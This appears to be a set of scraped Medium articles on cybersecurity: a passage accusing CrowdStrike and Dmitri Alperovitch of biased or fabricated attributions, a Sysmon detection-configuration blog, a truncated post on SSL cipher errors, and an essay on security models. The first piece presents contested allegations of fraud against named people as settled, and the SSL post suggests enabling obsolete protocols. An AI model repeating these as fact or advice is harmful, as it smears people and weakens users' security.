The services described would seem to run afoul of the Computer Fraud and Abuse Act, or CFAA (under the CFAA, private entities are restricted from pursuing offensive cyber security measures designed to infiltrate an attacker’s computer infrastructure for the purpose of learning how a cyber attack occurred.) CrowdStrike sought to mitigate any legal exposure presented by its new, innovative approach to cyber security by bringing Steven Chabinsky, a former FBI legal specialist with considerable experience in cyber intelligence operations, onboard as its general counsel.
Chabinsky didn’t believe that the CFAA represented an insurmountable obstacle to CrowdStrike’s aggressive approach; if a business was hacked, he held, it had every right to either delete or encrypt its property if it was discovered on the attacker’s computers. Chabinsky’s approach echoed the mentality of Alperovitch, who likened CrowdStrike’s offensive posture to defending ones property rights. “If I tackle you on the street, that’s assault and battery,” Alperovitch noted. “But if a few minutes prior you had taken my wallet, it’s completely legal.”
Shawn Henry and his team used CrowdStrike’s Falcon Overwatch capability to monitor the DNC’s compromised servers for more than 30 days, mapping out the scope of the intrusion and tracking the actions of the attackers. The scope of the Cozy Bear intrusion was potentially devastating. According to CrowdStrike, Cozy Bear had roamed uncontested throughout the totality of the DNC server, collecting and transmitting email and Voice over Internet Protocol (VoIP) communications. Significant amounts of data had been exfiltrated during this time, CrowdStrike assessed, and the DNC had to assume that anything stored in the server had been compromised.
Fancy Bear appeared to have more limited objectives. Henry’s team detected evidence of a few select files having already been exfiltrated, while others were staged for future exfiltration. An analysis of these files showed that Fancy Bear was focused on opposition research being done by the DNC on the erstwhile Republican nominee, Donald J. Trump.
While the CrowdStrike analysts believed they were able to isolate the malware, tools and techniques used by both Cozy Bear and Fancy Bear to facilitate the theft of DNC data, they were not able to determine the source of the initial intrusion for either threat actor. Threat intelligence from previous cyber attacks on other targets (including the German Parliament, a French television channel, TVMonde5, the US State Department and the White House) attributed to both Cozy Bear and Fancy Bear, suggested that the vector used to facilitate initial penetration of a targeted server was through a technique known as a “phishing” attack, where the attacker used fake documents and communications to trick the target into clicking on a field infected with malware. There was, however, no evidence on the DNC server that showed it had been subjected to a “phishing” attack. How the Cozy Bear and Fancy Bear malware came to infect the DNC server remained a mystery to CrowdStrike.
At some point, the decision was made by the DNC and CrowdStrike to go ahead and regain control of the DNC servers. But to CrowdStrike, this wasn’t enough. Sifting through the data collected by Shawn Henry and his Falcon Overwatch team, Dmitri Alperovitch was taken aback by the sheer audacity of what had transpired. Michael Sussman, the DNC legal counsel, agreed. “You have a presidential election underway here and you know that the Russians have hacked into the DNC,” Mr. Sussman told the New York Times. “We need to tell the American public that. And soon.”
At first the DNC tried to get the FBI to make the attribution call, figuring that it would garner more attention coming from the US government. But when the FBI wanted full access to the DNC server so that it could conduct a full forensic investigation, the DNC balked. Instead, after meeting with Alperovitch and Henry, the DNC and CrowdStrike devised a strategy to take the case to the public themselves. Alperovitch prepared a formal technical report that singled out the Russians for attribution. When it was ready, the DNC invited in a reporter from the Washington Post named Ellen Nakashima, who was given exclusive access to senior DNC and CrowdStrike personnel for an above-the-fold, front-page article.
Before the Washington Post could go to print, however, CrowdStrike needed to evict Cozy Bear and Fancy Bear from the DNC server, and deploy security mechanisms designed to keep them out. Over the course of two days, from June 10–12, CrowdStrike stealthily replaced the DNC’s software, moving carefully to avoid detection. With the DNC server clean and secure, the plan to “name and shame” Russia could go forward.
The Post article, published on the morning of June 14, 2016, went viral, with nearly every major media outlet, including the New York Times, citing it in their own subsequent investigations. When CrowdStrike published its technical report 30 minutes later, it was received by a media already driven to a frenzy and starving for information. The report, “Bears in the Midst: Intrusion into the Democratic National Committee,” quickly became headline news, and Dmitri Alperovitch, its author, a household name. The DNC and CrowdStrike, it seemed, had executed the perfect attribution campaign, creating a perfect storm of political intrigue and spy-versus-spy narrative that the media couldn’t ignore.
Part Two: Shady RatThe public attribution campaign targeting Cozy Bear and Fancy Bear wasn’t the first time Dmitri Alperovitch had engaged in a highly publicized “name and shame” operation. Back in 2011, when Alperovitch worked as the vice president of threat research for the cyber security giant, McAfee, he had published a similarly politically charged report, “Revealed: Operation Shady Rat.” This report was to push Alperovitch’s attribution strategy, and Alperovitch himself, to the forefront of a national dialogue on cyber security.
According to Esquire, it was Alperovitch’s own analysis of administrative logs from a compromised server that led him to conclude that Shady Rat was the culprit behind cyber attacks targeting dozens of companies around the world. Moreover, Alperovitch believed, this evidence pointed to China as the perpetrator of this hacking campaign. McAfee policy prevented this attribution from appearing in a formal company report, but this didn’t stop Alperovitch from naming names; when Vanity Fair specifically asked about the link between China and Shady Rat in mid-July 2011 (prior to the publication of the McAfee report), Alperovitch reiterated McAfee corporate policy about attribution, before observing, “If others want to draw that conclusion, I would not discourage them.”
In the weeks leading up to the public release of the Shady Rat report, Alperovitch privately pushed his view on Chinese attribution in a series of closed-door meetings with the White House, “executive-branch agencies” (i.e., the FBI and intelligence community), and congressional committee staff. These briefings proved to be a media bonanza for Alperovitch — once the Shady Rat report became public, the White House and Department of Homeland Security were compelled to acknowledge their awareness of the report and the issues it raised. The NSA had been tracking the various entities that comprised Shady Rat for years. However, the manner in which Shady Rat presented to the public helped create the impression that it was Alperovitch, and not American law enforcement or intelligence agencies, that uncovered the threat posed by China and Shady Rat.
As a marketing ploy, the Shady Rat report was pure genius, playing on the nexus of public ignorance and political paranoia that existed in the United States. A perfect example of this was a statement made by the Democratic Chair of the Senate Select Intelligence Committee, Dianne Feinstein, after reading Alperovitch’s Shady Rat report. Feinstein emailed Vanity Fair, who quoted her as saying Alperovitch’s Shady Rat report represented “further evidence that…we need to start applying pressure to other countries to make sure they do more to stop cyber hacking emanating from their borders.”
This was music to Alperovitch’s ears, since “naming and shaming” was a core principle behind his approach to cyber security. “We saw that no one’s really focused on the adversary,” Alperovitch later told Esquire. “No one’s focusing exclusively on how can we actually identify them, attribute them, deter them from taking this action again.” From the Shady Rat experience was born the ethos that later morphed into CrowdStrike’s corporate motto: “You don’t have a malware problem, you have an adversary problem.”
Almost overnight, Alperovitch and Shady Rat had become household names. The media (including Washington Post cyber beat reporter Ellen Nakashima) picked up the story and ran with it, making the linkage between Shady Rat and China an incontrovertible fact in the minds of the American public. It also boosted the stock of Aleprovitch and a colleague of his at McAfee named George Kurtz. Kurtz resigned from McAfee in October 2011, and within a month was brought on by Warburg Pincus, a private equity firm, as an Executive in Residence. Kurtz was slated to head up a new cyber security company, CrowdStrike, which Patrick Severson, a Managing Director at Warburg Pincus, was in the process of underwriting to the tune of $26 million in Series A funding.
Kurtz poached a number of senior executives from McAfee to join him at this new startup company, which he named CrowdStrike. But the jewel in CrowdStrike’s crown was the man around whom the company’s operating ethos would be constructed — Dmitri Alperovich. Alperovich left McAfee in mid-September, and by the end of that month was presenting his vision for cyber security at an event sponsored by Brookings. Alperovich helped co-found CrowdStrike with Kurtz and another McAfee alumnus, Gregg Marston. While Kurtz, Marston and Severson’s names populated the SEC filings submitted by CrowdStrike in December 2011 in regard to its funding efforts, it was Alperovitch’s cache that made it all possible.
Alperovitch’s name was well known, thanks in large part to the momentum created by his Shady Rat report and the accompanying Vanity Fair interview, which was published in September 2011. Brought in as the Chief Technology Officer for CrowdStrike, Alperovitch leveraged the reputation he built on the back of Shady Rat to promote one of CrowdStrike’s initial technological initiatives, Crowdsourced Reverse Engineering (CrowdRe), a free collaborative malware assessment tool. Even here, Alperovitch’s history with Shady Rat could be seen: the CrowdRe functional demonstration used as its case study a malware sample CrowdStrike sourced from what it named “Comment Panda” (the name it gave to the cyber adversary Alperovich claimed to have exposed as a result of his Shady Rat investigation).
This collaborative approach to cyber security was part and parcel of CrowdStrike’s operational methodology. “At CrowdStrike,” Alperovitch told one interviewer, “we look for traces of the adversary and try to find out who the adversary is, what they are after, and what their tradecraft is. We also disseminate that information to enable collective action.” In this, CrowdStrike was no different from other cyber security startups. What separated CrowdStrike from the pack were the pro-active measures Alperovitch promoted in defending against an identified threat. “We should enable the private sector to engage in self-defense in the cyber world, like we do in the physical world,” Alperovitch declared. “Licensed cyber security companies” in the mold of CrowdStrike should be allowed “to take certain actions in defense of a network…if you see your data going to some other network, why can’t you go into that network for the purpose of getting your data back, or take data off that machine to mitigate the damage?”
Alperovitch’s aggressive posturing was soon reinforced when, in May 2012, CrowdStrike hired Shawn Henry, who had just retired from 24 years service with the FBI. Henry’s last position with the FBI was as the Executive Assistant Director of the Criminal, Cyber, Response and Services Branch, where he oversaw the entirety of the FBI’s cyber response capability. Like Alperovitch, Henry was frustrated with the approach being taken by the US government and private industry when it came to responding to cyber attacks against American targets. “I don’t see how we ever come out of this without changes in technology or changes in behavior, because with the status quo, it’s an unsustainable model,” Henry told an interviewer from the Wall Street Journal in March 2012, shortly before leaving the FBI.
Alperovitch’s smarts and Henry’s brawn made for a perfect combination of personalities that enabled CrowdStrike to market its new image as a private cyber intelligence agency, one that, according to a Los Angeles Times company profile, “identifies sophisticated foreign attackers trying to steal US intellectual property and uses the attackers’ own techniques and vulnerabilities to thwart them.” This aggressive posturing proved to be highly effective; in 2013 Crowdstrike was able to secure an additional $30 million in Series B funding from Accel Partners and Warbus Pinkus. Alperovitch was showered with praise, selected by MIT Technology Review as a “Young Innovator Under 35,” and named by Foreign Policy as one of the “Top 100 Global Thinkers” for 2013, largely on the reputation he garnered from his 2011 Shady Rat report.
But while Alperovitch may have charmed the billionaires who were underwriting the CrowdStrike enterprise, several of his fellow cyber sleuths smelled a rat. One of them, Eugene Kaspersky, took the time to put his concerns into writing. Kaspersky is the CEO and founder of Kaspersky Lab, a well-regarded Russian-based cyber security company. “We conducted detailed analysis of the Shady Rat botnet and its related malware,” Kaspersky wrote in an August 2011 blog, “and can conclude that the reality of the matter (especially the technical specifics) differs greatly from the conclusions made by Mr. Alperovitch.” Moreover, Kaspersky stated, “We consider those conclusions to be largely unfounded and not a good measure of the real threat level,” adding that “we cannot concede that the McAfee analyst was not aware of the groundlessness of the conclusions, leading us to being able to flag the report as alarmist due to its deliberately spreading misrepresented information.”
Symantec, the maker of the popular Norton Anti-Virus software, shared Kaspersky’s concerns over Alperovitch’s exaggeration and outright misrepresentation of the Shady Rat threat. Writing for the Symantec company blog, Hon Lau, a security analyst, noted that Symantec had “uncovered what appears to be the same information source about the victims of the attacks that was used by McAfee as the basis of their report. This information is freely available on the attackers’ command and control site, which is a strange oversight considering this type of attack is often described as ‘advanced’ or ‘sophisticated.’”
Lau also undercut Alperovitch’s self-made reputation as a super cyber sleuth. “It turned out,” Lau wrote, “that the attackers not only failed to secure their server properly, they had also installed various Web traffic analysis tools on it too, which is of course useful to the attackers to see how they are doing, but makes our lives easier too when investigating such attacks. For example, on one of the sites we were able to see the statistics about computers contacting the command and control server to download command files. Based on this information, we were also able to determine the organizations affected by this threat.”
Both Lau and Kaspersky discounted Alperovitch’s efforts to attribute blame for the Shady Rat cyber attacks on China. “There has been some discussion,” Lau noted, “of this being a government-sponsored attack. However, the finger can’t be pointed at any particular government. Not only are the victims located in various places around the globe, so too are the servers involved in these attacks.”
Kaspersky echoed this point, stating, “It looks overwhelmingly likely that no state is behind the Shady Rat botnet. How the botnet operates and the way the related malware is designed reveals startling fundamental defects hardly indicative of a well-funded cyber-attack backed up by a nation state.”
Alperovitch had described Shady Rat as “an advanced persistent threat,” a “sophisticated penetration” where “the adversary is motivated by a massive hunger for secrets and intellectual property.” Neither Kaspersky nor Symantec shared this conclusion. “When you consider the errors made in configuring the servers and the relatively non-sophisticated malware and techniques used in this case,” Lau wrote, “one could not call Shady Rat an advanced persistent threat.” Moreover, as Kaspersky pointed out, the IT industry was already fully aware of the Shady Rat phenomenon, “but decided not to ring any alarm bells due to its very low proliferation — as confirmed by our cloud-based cyber-threat monitoring system and by other security vendors. It has never been on the list of the most widespread threats.”
Contrary to Alpertovitch’s claims that Shady Rat was responsible for stealing “secrets and intellectual property,” Kaspersky notes that a review of the logs used by Alpertovitch make clear that “there is no evidence showing what sort of data has been acquired from infected computers, or if any data has been acquired at all.” Lau reached the same conclusion, noting, “What‘s still unclear is the type of information the attackers were targeting.”
In retrospect, Shady Rat appears to have been perpetrated for one purpose — to manufacture a narrative that could be exploited for the personal benefit of Dmitri Alperovitch, George Kurtz and Gregg Marston, the three former McAfee executives who founded CrowdStrike. Alperovitch and George Kurtz had been planning to leave McAfee prior to the Shady Rat report being published. Alperovitch told Esquire Magazine that he accelerated his plans to depart McAfee because of his outrage at being “censored” by corporate executives uneasy over his attribution of China in the report. But this is disingenuous; as Alperovitch related to Vanity Fair during his exclusive pre-publication interview, McAfee policy at the time was not to speculate on what country was behind Shady Rat. It was this long-standing policy, and not any knee-jerk corporate reaction to the Shady Rat report, that drove the top-down request to remove specific attribution from the report.
It appears that Alperovitch concocted the Shady Rat threat from thin air, and then promulgated its existence through private meetings with government officials predisposed to accept any public reporting that sustained the notion of a Chinese cyber threat to the United States. Alperovitch, Kurtz and Marston were more than likely planning what would eventually become CrowdStrike well prior to the Shady Rat report being published — one does not simply attract tens of millions of dollars in investment funding on the fly. The entire Shady Rat enterprise — the report, the secret government briefings, the exclusive high profile article — appeared to be designed to elevate Alperovitch’s public profile on the eve of his resignation from McAfee and the creation of CrowdStrike, a profile Kurtz and Marston were only to willing to exploit. If this was indeed the case, it was at a minimum deceptive marketing, and America fell for it.
There was a fourth McAfee executive who claims he was supposed to be a part of the CrowdStrike venture. Stuart McClure, the current CEO of Cylance, a California-based cyber security company (and competitor of CrowdStrike), claims that he was invited by George Kurtz to join CrowdStrike in early 2012, an offer McClure says he turned down. “I decided I needed to live my life with high integrity and with high-integrity people, so I decided to do this gig (Cylance) on my own.” (Kurtz denies that he offered McClure a position in CrowdStrike.) Normally such claims would be downplayed, especially given the contentious history between the two men, who were colleagues and business partners for 14 years before their falling out. But McClure’s reference to “high integrity,” made in a manner suggesting both Kurtz and the CrowdStrike business venture were found lacking in such by McClure, cannot simply be dismissed in light of the Shady Rat fraud perpetrated by Alperovitch and, by extension, Kurtz.
The observations of Jeffrey Carr, a well-regarded cyber security author, are relevant in this regard. In a blog posting titled “Where’s the ‘Strike’ in CrowdStrike,” Carr noted that, as of September 2012, CrowdStrike had announced the recruitment a number of highly skilled employees, but “so far they haven’t announced much in the way of a product line.” Carr was on record as stating that the Shady Rat report authored by Alperovitch was “an indictment of McAfee as an information security company,” noting that “it’s a lot easier to blame China than to acknowledge how you and your company have been profiting from a failed security model for all these years while hiding that fact from your customers.” With CrowdStrike, Carr observed, Alperovitch seemed to be repeating the same pattern of overselling his company’s capabilities.
“The company (CrowdStrike) website,” Carr writes, “claims to offer ‘Enterprise Adversary Assessment’ where ‘we identify the adversary and find out what they’re after.’ And how do they do that? Back to the website: ‘Through hunting operations, including host-based detection, threat-specific network analysis, and victim threat profiling.’” Carr, however, is critical of these claims, noting “CrowdStrike cannot currently deliver anything unique in the infosec space…that other companies aren’t already doing unless it significantly improves its sources and methods regarding identifying adversary state and non-state actors and pushes the envelope on active defense.”
The biggest sin, according to Carr, was the fact that the CrowdStrike methodology represented little more than “a continuation of the piss-poor intelligence that Dmitri Alperovich published while at McAfee,” singling out the Shady Rat paper as a case study in point. “There’s over 30 nation states developing computer network attack, defense, and exploitation capabilities,” Carr notes, “and at least a dozen that are highly proficient and actively conducting cyber espionage yet somehow McAfee’s ‘intelligence analysts’ only see China.”
Carr points out that while CrowdStrike “talks about identifying adversaries via toolmarks and the usual TTPs 9tools, techniques and procedures) that every so-called cyber intelligence firm narrowly focuses their attention on but that’s not analysis…that’s a cognitive trap known as target fixation. If after looking at all of the technical parameters,” Carr concludes, “the only nation state that you see is China, you need to find another job because you suck as an intelligence analyst.”
A former intelligence analyst named Michael Tanji echoes Carr’s concerns. Tanji spent 20 years working for the Defense Intelligence Agency, the National Security Agency, and other intelligence organizations, where he specialized in computer network operations and computer forensics. In an article entitled, “Malware Analysis: The Danger of Connecting the Dots”, Tanji asked the following question: “If I give you a malware binary to reverse engineer, what do you see?” His answer is telling: “Exactly what the author wants you to see.”
Tanji wrote:
I want you to see words in a language that would throw suspicion on someone else. I want you to see that my code was compiled in a particular foreign language (even though I only read and/or write in a totally different language). I want you to see certain comments or coding styles that are the same or similar to someone else’s (because I reuse other people’s code). I want you to see data about compilation date/time, PDB file path, etc., which could lead you to draw erroneous conclusions have no bearing on malware behavior or capability.
Extrapolating from Tanji’s words, one sees that, when it came to Shady Rat, Alperovitch wanted to see China, so he did. This was the ultimate flaw in the methodology Alperovitch brought with him from McAfee to CrowdStrike, a willingness to make assumptions based upon misplaced certainty, to shoehorn unknowns into these assumptions, to allow personal bias to dictate the data set, and to let personal animus influence conclusions that might not otherwise be valid. This is what Alperovitch did with Shady Rat while working for McAfee back on 2011. Five years later, history repeated itself: CrowdStrike, with Alperovitch in the lead, fell into the exact same target fixation cognitive trap when it came to Cozy Bear and Fancy Bear.
Part Three: Guccifer 2.0Alperovitch and CrowdStrike nearly pulled it off. The “name and shame” strategy is designed to embarrass state-sponsored actors, compelling them to cease and desist their criminal cyber activity while mobilizing political support at home for more robust cyber security policies intended to keep the identified perpetrators at bay. Had the attack on the DNC server been an actual Russian state sponsored event, this approach might have worked.
Almost immediately after the one-two punch of the Washington Post article/CrowdStrike technical report went public, however, something totally unexpected happened — someone came forward and took full responsibility for the DNC cyber attack. Moreover, this entity — operating under the persona Guccifer 2.0 (ostensibly named after the original Guccifer, a Romanian hacker who stole the emails of a number of high-profile celebrities and who was arrested in 2014 and se","['Cybersecurity', 'Dnc Hack', 'Crowdstrike', 'Scott Ritter', 'Dmitri Alperovitch']"
Endpoint detection Superpowers on the cheap — part 1,https://medium.com/@olafhartong/endpoint-detection-superpowers-on-the-cheap-part-1-e9c28201ac47?source=tag_archive---------8-----------------------,"In this blog series, I will talk about my endpoint detection stack focused on Windows environments and mostly based on Sysmon.
I feel I need to fire some form of disclaimer;
This series of posts are not a silver bullet. It will require tuning and real work to be truly effective in your environment.
That said this will also be your biggest benefit, that work will pay off in various strengths which will be discussed later.
I must start this post by highlighting the great work accumulated in the MITRE ATT&CK framework. Most of you are familiar with it by now and if whether are or not, please schedule some dedicated time to properly go through it. It truly is a treasure trove for security people, regardless which side you're on. They describe it themselves as;
“ A framework for describing the behavior of cyber adversaries operating within enterprise networks. ”
Which simply put boils down to a comprehensive library of “what to look for”. They capture attacker tools and techniques in a generic way, guiding and encouraging you learn to adopt them for yourself. They don't give specifics, which will (hopefully) keep you from suffering from tunnel vision in trying to detect these techniques.
There are already a lot of great resources explaining all kinds of things about sysmon, I've learned a lot from Roberto Rodriguez and SwiftOnSecurity so check them out.
The most important part about sysmon which I do want to highlight are its sensing powers. Based on the configuration you provide it, it is able to log the following events;
These events will be stored in the Windows Event Log within Microsoft-Windows-Sysmon/Operational.
There are quite some good configurations available on the internet already, despite that I still decided to create my own repository a couple of months ago for several reasons.
First and foremost I wanted to create something that is modular, which makes it easy to maintain, switch a small building block or add something that is specific to you or one of my customers. As I mentioned in the beginning of this blog, you'll need to be tuning. Some drivers, processes or other events which are operating fine for me and my customers might be extremely noisy in your environment.
Apart from that I wanted to map every capability I could interpret to the MITRE ATT&CK framework and track my coverage.
What I did is use a base template configuration, which is essentially an empty skeleton to be used on any configuration module.
Next I created subfolders per EventID type to be generated by Sysmon. Within these folders there are often 2 types of configuration XML files, include and exclude certain event types.
The above example will generate a log event whenever the Image (launched process) will end with regsvcs.exe or regasm.exe respectively. The corresponding MITRE technique is added behind each mapped item as a comment. Currently there is no support for log augmentation but my feature request to add this has been confirmed as being on the to-add list.
The above example prevents Sysmon from logging whenever one of the (Parent)Images is launched. These generate a lot of logging where the true negatives are expected to very slim.
This obviously is always a tradeoff between visibility and noise, in the end it should be a factor in the decision to accept the risk of missing it or not.
If we dig a little bit deeper into the configuration options there are a few notable things. One of the most important things is that each rule is considered as a single configuration, there is no way to stack options of for instance a process together with a specific command line. Each line will be processed by itself, which requires you to think it through.
To understand which options are available you can start Sysmon with the -s attribute, this will show you the currently supported schema, commandline parameters and filtering options. (the full schema is visible here)
The above image shows all configuration options that can be used to specify a configuration rule. Depending on your detectables you could also create multiple indicators for certain techniques should you so desire.
To specify each condition the following options are allowed; is,is not,contains,excludes,begin with,end with,less than,more than,image
All these modules can be merged into your configuration through a PowerShell module created by Matt Graeber, how to do this is mentioned in my git repo.
You might want to add some driver of process exclusions for instance for not get flooded with events. There are touchpad drivers in existence for example that think it’s a great idea to use the Windows registry as a buffer to -all- mouse movements, trust me there are developers that do this… :)
This repository is used by me and my colleagues (apart from the rest of the ppl that forked/cloned it) at several customers varying from several hundred to thousands of systems. Some will have some tailored configurations due to their specific needs. In general the currently running configuration does generate on average between 5–25 megabyte per day. This obviously depends on the local activity of the system and whether it is a workstation or a server. Regardless, these amounts are perfectly digestible in any SIEM/Logger/whatever you prefer to use.
This post focussed primarily on Sysmon and its configuration, next topics will cover;
Written by
","['Cybersecurity', 'Sysmon', 'Threat Hunting', 'Splunk', 'Dfir']"
ERR_SSL_VERSION_OR_CIPHER_MISMATCH: Fix it within 5 minutes,https://medium.com/@thesslstore/err-ssl-version-or-cipher-mismatch-fix-it-within-5-minutes-e7758cf3bc44?source=tag_archive---------3-----------------------,"If you’re facing the ERR_SSL_VERSION_OR_CIPHER_MISMATCH error, we understand the state of mind you’re in right now. You’re frustrated, you’re curious, and you’re a bit mad. I totally get it. I too have been there, and it sucks. But working in the web security domain has its perks. I’ve got some brilliant minds around me who can get at the root of such errors and come up with accurate solutions. When we got asked about the ERR_SSL_VERSION_OR_CIPHER_MISMATCH message by our customers, our SSL experts took out their magnifying glasses and found some solutions.
While examining the anatomy of this error, they found that Google’s and Mozilla’s deprecation of RC4 cipher is causing the ERR_SSL_VERSION_OR_CIPHER_MISMATCH error. So, they came up with four possible solutions to get this error out of your systems.
I know you want to fix ERR_SSL_VERSION_OR_CIPHER_MISMATCH right now, and that’s why I won’t waste much of your time. But before you get to the fixes, there are a few things to keep in mind. These things are:
Let’s get started!
Note: This step includes enabling older, insecure protocols. Go ahead at your own risk.
[Editor’s Note: While we are offering this as a possible solution, I cannot stress enough that this is a dangerous decision to make. Older versions of TLS and especially SSL have known vulnerabilities. A better course of action would be to contact the site owner and request that they update their SSL/TLS implementation to only support modern protocol versions. You really shouldn’t be connecting with anything before TLS 1.2 at this point. Just to be clear, The SSL Store does not suggest enabling outmoded SSL/TLS versions on your browser. For all intents and purposes this suggestion, as well as solution 2, is being presented strictly for academic purposes. -PN]
To know about other solutions read here.
Written by
","['Ssl Certificate', 'Ssl', 'Tls', 'Https', 'Cybersecurity']"
Escaping Dark Age Cybersecurity Thinking - Jim Burrows - Medium,https://medium.com/@brons/escaping-dark-age-cybersecurity-thinking-3e7b0c74bda8?source=tag_archive---------2-----------------------,"Much of what’s wrong today in the realm of security, especially “cybersecurity” comes from thinking that is rooted in the Dark Ages.
There are several problems with the way we think about security and handle it today, but it seems to me that they can all be traced, at least in part, back to one fundamental mistake: we use the wrong model when thinking about security, especially computer and network security, one that I’ll call the “Motte and Bailey” model.
Motte and Bailey is the name of a design for building castles that goes back to the days of William, the Conqueror, a millennium ago. The bailey is a courtyard surrounded by a wall or palisade. It is built upon the motte, an earthwork mound, usually a natural hill that has been artificially enhanced, leaving a surrounding ditch. The idea is that the motte sets the castle well apart from the surrounding countryside and that the palisade atop it creates a safe zone within it. Over the years, the ditch around the base of the motte evolved into the water-filled moat we associate with castles today.
The “Motte and Bailey” model of security suggests to us that what we are defending is set off from the rest of the world and that along its boundary we have built a protective wall, within which there is a zone of safety for us and ours. It’s fairly easy to see how this model applies to security mechanisms. My account on a multi-user system is set apart from everyone else’s and is protected with a password. My Local Area Network (LAN) is separated from the internet at my router and contained within my firewall and so on.
The Motte and Bailey castle and the designs that grew from it, along with the Roman walled city became the model upon which the cities of Europe were built. As the cities grew, the problem inherent in the model, even as applied to cities, became obvious. Once the city was big and complex enough, once it had enough commerce with the outside world, the notion that it was safer within the palisade became less and less true.
To continue my historical metaphor, let us fast forward six or seven centuries to visit the Paris of Nicolas-Gabriel de la Reynie, the man often credited with the creation of the modern police force, although what he did was a good deal more than that.
By de la Reynie’s day it became clear that the modern city was often less safe than the countryside around it. It was not enough to be set apart from the rest of the countryside on the Île de la Cité, or to have a wall. Chaos within the city, and the dangers that it brought had to be addressed.
First, as Lieutenant, and then Lieutenant-General of Police, he oversaw what would today be the police and fire departments; the courts; the departments of public works, sanitation and public health; the zoning commission; the bureau of weights and measures; the coroner’s office and more. His duties included responsibility for the hospitals and prisons; regulating publishers, printers and book sellers as well as the food supply and prices; inspection of markets, fairs, hotels, boarding houses, gambling houses and brothels; overseeing the elections of masters and wardens of the six merchant guilds. He was responsible for the construction of a bridge over the Seine, requiring the alignment of houses in a regular plan, and an extensive system of street lights, leading to Paris being called “the City of Lights”.
Cities, once walled and built upon hills or islands for safety, became systems far too complex and too well connected to the outside world to be protected by a simple barrier. Systems thinking and an infrastructure designed to allow both the detection and management of problems became necessary. Today, like de la Reynie’s Paris, the computer has outgrown the Motte and Bailey model. There is no clear boundary between the safe inner bailey and the hostile outside world.
Both cities and computer systems are highly complex internally and have large and growing numbers of connections to the outside world. We even use the same language. The word “port”, meaning “gate”, once referred to the gates in a city wall. By analogy, it extended to the harbor cities that were the gateway between a country and the world. On computers, ports are the connections to external devices and networks. In each case, they became crucial to accomplishing the work for which the castle, city, nation or computer exists.
The complexity within the walls and the number of connections through it both break down the isolation of the motte and palisade. The city of Paris grows far beyond the motte, and then the shores of the island, until its neighborhoods and suburbs completely obliterate any sense of boundary upon which the wall can be built, and what wall there is is broached by more and more gates and bridges.
Similarly, the boundaries of the “local network” are blurred, both as “cloud computing” and “eCommerce” draw our valuables out onto the internet, and as mobile and “Internet of Things” (IoT) devices draw the Internet into our homes and businesses. On the computer, the BIOS becomes as complex as an operating system, and we run more and more background tasks, and more of those background tasks are connected to the internet and the cloud. The infrastructure within the boundary becomes larger and more complex. All of this, Smartphones, flash drives, the IoT and WiFi access points open more and more holes through the wall, creating new vectors into our LANs and our computers.
And so, like the Paris of three centuries ago, the domain of cyber security has become far too complex for the Motte and Bailey model. Simple barriers won’t keep the bad things out. Isolation isn’t enough. This has been recognized for some time in large enterprises, by security aware IT departments. In this environment firewalls are joined by other technologies and strategies, many of which parallel de la Reynie’s strategies.
The modern Chief Information Security Officer (CISO) has many tools and strategies: Intrusion Detection Systems, Intrusion Prevention Systems, Defense in Depth, Active Defense, Red Teams, Penetration Testing, Bug Bounties and the like. All of these make the CISO role similar to that of Lieutenant-General of Police, but therein lies a problem. The Sun King solved the problem of security in Paris by putting de la Reynie in charge of everything, controlling the many constabularies, the courts, the censors, the markets, the guilds, sanitation and city design.
That worked for a city of a few hundred thousand, but not so much for larger and smaller communities. A CISO with a suitable staff, well equipped, is a valuable resource for a major enterprise, but as the risk grows, or as a solution for thousands or millions of businesses, hundreds of millions of households, that strategy has its limits. It is, in many ways, just a sophisticated elaboration of the notion of defending a well delimited territory. It is a real improvement, a step up, but just as no one runs a city like 17th and 18th century Paris any more, it is of limited applicability.
The Motte and Bailey model suggests that there is such a state as “secure”, that if only our firewall were impenetrable enough, we could have complete safety. With individual malware systems being capable of compromising a million or more computers in order to use them for their own purposes as parts of a “botnet”, it is pretty clear that we will never see “safe” again, that the “war” against botnets of “zombie computers” will never be won, any more than we will ever find a multicellular animal uninfected by bacteria and viruses.
What we need in cyber security is not a firewall, not a motte and palisade to keep our bailey inviolate, but an immune system. We need to realize that no system will ever be fully secure, but rather that as threats arise, it can remain healthy and viable, that it can shake off any ill effects before they become life-threatening. It is not a binary question of whether the system is secure or not, but a question of degree, of how vulnerable, how healthy, how well protected the system is.
The Motte and Bailey model colors our language. We think in terms of security “breaches” as the wall is penetrated. We talk of threats and attacks, drawing up sides between hostile outsiders and trusted insiders. A more functional risk analysis would examine all of our information flow, both external and internal, looking not only at how outsiders break in, but who has access to information, how sensitive information is handled, whether public and private information and access are intertwined, and so forth.
A number of problems arise from thinking of security in terms of boundaries and barriers, especially as the area within the boundaries becomes larger and more complex.
It’s hard to say that a book like Ross Anderson’s Security Engineering was a symptom of what we are doing wrong, given how valuable a resource it has been for understanding how to build reliable systems, or the ways that security is breached, and even harder to cite Bruce Schneier’s forward to it as symptomatic, yet Bruce wrote in that foreword that:
Programming a computer is straightforward: keep hammering away at the problem until the computer does what it’s supposed to do. Large application programs and operating systems are a lot more complicated, but the methodology is basically the same. Writing a reliable computer program is much harder, because the program needs to work even in the face of random errors and mistakes: Murphy’s computer, if you will. Significant research has gone into reliable software design, and there are many mission-critical software applications that are designed to withstand Murphy’s Law.
Writing a secure computer program is another matter entirely. Security involves making sure things work, not in the presence of random faults, but in the face of an intelligent and malicious adversary trying to ensure that things fail in the worst possible way at the worst possible time . . . again and again. It truly is programming Satan’s computer.
Security engineering is different from any other kind of programming. It’s a point I made over and over again: in my own book, Secrets and Lies, in my monthly newsletter Crypto-Gram, and in my other writings. And it’s a point Ross makes in every chapter of this book. This is why, if you’re doing any security engineering . . . if you’re even thinking of doing any security engineering, you need to read this book. It’s the first and only, end-to-end modern security design and engineering book ever written.
This passage exhibits one danger of Motte and Bailey thinking in that it allows us to think of security as a separate thing, and not an essential part of every working system. “Security engineering is different from any other kind of programming” only if there is some safe place that insecure programs can survive. But today, as networked computers appear everywhere, there no longer is a place for insecure programs. In November, hackers demonstrated the ability to take over IoT lightbulbs, showing that even the code that runs in a lightbulb requires security engineering. A month before that, one of the largest cyber attacks ever, which affected Twitter, the Guardian, Netflix, Reddit, CNN, Wired and many others, was launched using a botnet of compromised security cameras and DVRs.
Compare what Bruce wrote above to the following quote from the introduction to a draft version of one of the whitepapers created for the Department of Energy’s “Transforming Cybersecurity” initiative a few years back:
